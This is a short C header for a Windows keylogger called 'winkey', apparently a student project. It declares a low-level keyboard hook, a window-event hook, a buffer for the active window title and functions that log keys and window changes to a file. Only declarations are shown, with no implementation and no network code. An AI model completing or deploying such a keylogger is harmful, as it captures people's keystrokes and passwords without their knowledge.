#ifndef WINKEY_H
# define WINKEY_H

# define WIN32_LEAN_AND_MEAN
# include <windows.h>
# include <conio.h>
# include <winuser.h>
# include <stdio.h>
# include <stdint.h>
# include <stdlib.h>

# define WINDOW_TITLE_SIZE 256

typedef struct		s_winkey
{
	HHOOK			hook_keyboard;
	HWINEVENTHOOK	hook_event;
	char			window_title[WINDOW_TITLE_SIZE];
	char			window_prev[WINDOW_TITLE_SIZE];
	FILE			*stream;
}					t_winkey;

extern t_winkey		g_winkey;

/* log.c */
void				log_window(SYSTEMTIME st, char *window_name);
void				log_key(char *buffer, char *ptr);

/* hook.c */
LRESULT __stdcall	hook_callback(int n_code, WPARAM w_param, LPARAM l_param);
LRESULT __stdcall	win_event_proc_callback(HWINEVENTHOOK hWinEventHook, DWORD dwEvent, HWND hwnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime);

#endif
